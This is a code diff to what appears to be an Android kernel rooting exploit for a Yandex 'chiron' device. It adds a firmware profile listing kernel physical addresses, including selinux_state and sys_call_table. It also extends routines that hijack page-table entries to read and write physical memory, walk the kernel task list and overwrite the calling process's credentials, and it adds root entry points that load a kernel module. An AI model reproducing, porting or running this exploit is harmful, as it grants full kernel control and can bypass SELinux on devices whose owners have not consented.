@@ -102,6 +102,7 @@ struct chiroru_profile {
   const char *kernel_release;
   const char *machine;
   uint64_t image_pa;          /* physical start of the arm64 Image        */
+  uint64_t image_size;        /* optional runtime ARM64 header check      */
   uint64_t init_task_pa;      /* physical address of init_task           */
   /* Legacy profiles derive the linear-map base from init_task.tasks.next
    * minus a calibrated physical offset.  Newer profiles read the kernel's
@@ -207,6 +208,35 @@ static const struct chiroru_profile profile_5000001245 = {
     .modules_supported = 1,
     .vendor_count = 4,
     .vendor = vendor_syms_5000001245,
+};
+
+/* OTA-verified 5000001248 candidate; on-device validation is pending.
+ * The syscall table is independently located by seven slots in the OTA Image.
+ * Other globals are checked against __primary_switched, arm64_memblock_init,
+ * copy_init_mm, selinux_init and selinux_cred_prepare. Use runtime memory-map
+ * values rather than importing a calibrated task-list offset from 1245. */
+static const struct chiroru_vendor_sym vendor_syms_5000001248[] = {
+    {"selinux_state", 0x147CB10ULL},
+    {"selinux_blob_sizes", 0xFE2784ULL},
+    {"sys_call_table", 0xEEE718ULL},
+    {"init_mm", 0x12BE860ULL},
+};
+static const struct chiroru_profile profile_5000001248 = {
+    .id = "chiron-5000001248",
+    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001248:user/dev-keys",
+    .incremental = "5000001248",
+    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001248",
+    .machine = "aarch64",
+    .image_pa = 0x1080000ULL,
+    .image_size = 0x14b7000ULL,
+    .init_task_pa = 0x22f7500ULL,
+    .use_magic_lbase = 0,
+    .memstart_addr_pa = 0x2062310ULL,
+    .vabits_actual_pa = 0x2097f28ULL,
+    .kimage_voffset_pa = 0x2062320ULL,
+    .modules_supported = 1,
+    .vendor_count = 4,
+    .vendor = vendor_syms_5000001248,
 };
 #define WALK_SUB       T_TASKS      /* va -> task_struct                    */
 #define WALK_PREV_OFF  T_TASKS_PREV /* where the walk reads the next va     */
@@ -1151,15 +1181,37 @@ static int attempt_once(const struct chiroru_profile *prof,
     volatile uint8_t *slot0 =
         (volatile uint8_t *)((char *)spray_base +
                              (size_t)found_block * BLOCK_BYTES);
+    /* Closing a PTE does not invalidate the CPU's cached translation.
+     * Every physical mapping in this attempt needs a fresh virtual slot. */
+    int next_slot = 3;
+
+    if (prof->image_size) {
+      /* A candidate's physical load address must match the live Image header
+       * before reading globals or modifying any credentials. */
+      int slot = next_slot++;
+      volatile uint8_t *p = win_open(table, slot, table0, prof->image_pa, slot0);
+      uint64_t size = 0, text_offset = 0;
+      uint32_t magic = 0;
+      if (!p) { rp(r, "FAIL no entry for Image header\n"); goto out; }
+      memcpy(&text_offset, (const void *)(p + 8), 8);
+      memcpy(&size, (const void *)(p + 16), 8);
+      memcpy(&magic, (const void *)(p + 56), 4);
+      win_close(table, slot);
+      if (magic != 0x644d5241U || size != prof->image_size || text_offset != 0x80000ULL) {
+        rp(r, "FAIL kernel Image header does not match the OTA profile\n");
+        goto out;
+      }
+    }
 
     if (prof->use_magic_lbase) {
       /* Legacy profile: init_task.tasks.next minus a calibrated physical
        * offset.  The offset is only valid for this exact build. */
-      volatile uint8_t *p = win_open(table, 3, table0, init_page_pa, slot0);
+      int slot = next_slot++;
+      volatile uint8_t *p = win_open(table, slot, table0, init_page_pa, slot0);
       uint64_t next = 0;
       if (!p) { rp(r, "FAIL no free entry for lbase\n"); goto out; }
       memcpy(&next, (const void *)(p + init_lbase_raw), 8);
-      win_close(table, 3);
+      win_close(table, slot);
       if (next < 0xffffff8000000000ULL) {
         rp(r, "FAIL init_task.next=0x%llx\n", (unsigned long long)next);
         goto out;
@@ -1178,11 +1230,12 @@ static int attempt_once(const struct chiroru_profile *prof,
       uint64_t page_off;
       for (int q = 0; q < 3; q++) {
         uint64_t pa = pas[q];
-        volatile uint8_t *p = win_open(table, 3 + q, table0,
+        int slot = next_slot++;
+        volatile uint8_t *p = win_open(table, slot, table0,
                                        pa & ~0xfffULL, slot0);
         if (!p) { rp(r, "FAIL no entry for kernel base\n"); goto out; }
         memcpy(&vals[q], (const void *)(p + (pa & 0xfffULL)), 8);
-        win_close(table, 3 + q);
+        win_close(table, slot);
       }
       if (vals[1] < 32 || vals[1] > 52) {
         rp(r, "FAIL vabits_actual=%llu\n", (unsigned long long)vals[1]);
@@ -1203,7 +1256,7 @@ static int attempt_once(const struct chiroru_profile *prof,
 
     /* Walk the task list to our own task_struct. */
     {
-      int k = prof->use_magic_lbase ? 4 : 6, n;
+      int k = next_slot, n;
       uint64_t va;
       uint64_t cur_cred = 0, cur_task_pa = 0;
       volatile uint8_t *p = win_open(table, k, table0, init_page_pa, slot0);
@@ -1526,6 +1579,11 @@ int chiron_5000001245_root(const char *ko_path, const char *ksud_path,
   return chiroru_root_with(&profile_5000001245, ko_path, ksud_path, run_hooks, r);
 }
 
+int chiron_5000001248_root(const char *ko_path, const char *ksud_path,
+                           int run_hooks, struct rpt *r) {
+  return chiroru_root_with(&profile_5000001248, ko_path, ksud_path, run_hooks, r);
+}
+
 const char *chiron_1982735225_probe(void) {
   static char out[6144];
   char fp[192] = {0}, inc[96] = {0};
@@ -1593,6 +1651,22 @@ int chiron_5000001245_adb_root(const char *ko, const char *loader, int hooks, st
   if (snprintf(adb_console_params, sizeof adb_console_params,
                "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
   return chiroru_root_with(&profile_5000001245, ko, loader, -1, r);
+}
+
+int chiron_5000001248_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
+  (void)hooks;
+  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
+  char context[160] = {0};
+  int uid = adb_app_identity(r);
+  if (uid < 0) return -1;
+  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
+  if (fd >= 0) close(fd);
+  if (n <= 0) return -1;
+  context[strcspn(context, "\n")] = 0;
+  if (snprintf(adb_console_params, sizeof adb_console_params,
+               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
+  return chiroru_root_with(&profile_5000001248, ko, loader, -1, r);
 }
 
 int chiron_1982735225_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
